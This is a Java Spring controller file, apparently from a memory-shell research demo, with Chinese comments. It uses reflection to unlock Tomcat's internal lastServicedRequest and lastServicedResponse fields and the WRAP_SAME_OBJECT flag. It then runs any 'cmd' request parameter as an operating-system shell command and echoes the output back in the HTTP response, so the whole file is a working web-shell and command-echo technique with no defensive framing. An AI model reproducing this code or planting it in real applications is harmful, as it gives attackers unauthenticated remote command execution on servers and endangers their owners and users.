package com.example.memshell.controller;

import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterChain;
import org.apache.catalina.connector.Response;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.Scanner;

@Controller
@RequestMapping("/app")
public class Echo1Controller {
    @RequestMapping("/test")
    @ResponseBody
    public void testDemo() throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
        //反射
        Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
        Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
        Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
        //获取modifiers字段
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        //将变量设置为可访问
        modifiersField.setAccessible(true);

        //取消FINAL属性
        modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);
        modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);
        modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);
        //将变量设置为可访问
        WRAP_SAME_OBJECT_FIELD.setAccessible(true);
        lastServicedRequestField.setAccessible(true);
        lastServicedResponseField.setAccessible(true);

        //获取变量
        ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);
        ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
        boolean WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(null);
        String cmd = lastServicedRequest != null ? lastServicedRequest.get().getParameter("cmd") : null;
        if (!WRAP_SAME_OBJECT || lastServicedResponse == null || lastServicedRequest == null) {
            //设置ThreadLocal对象
            lastServicedRequestField.set(null, new ThreadLocal<>());
            lastServicedResponseField.set(null, new ThreadLocal<>());
            //将变量设置为true
            WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);
        } else if (cmd != null) {
            //获取lastServicedResponse中存储的变量
            ServletResponse responseFacade = lastServicedResponse.get();
            responseFacade.getWriter();
            java.io.Writer w = responseFacade.getWriter();
            Field responseField = ResponseFacade.class.getDeclaredField("response");
            responseField.setAccessible(true);
            Response response = (Response) responseField.get(responseFacade);
            Field usingWriter = Response.class.getDeclaredField("usingWriter");
            usingWriter.setAccessible(true);
            //设置usingWriter为false
            usingWriter.set((Object) response, Boolean.FALSE);

            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            w.write(output);
            w.flush();
        }
    }

}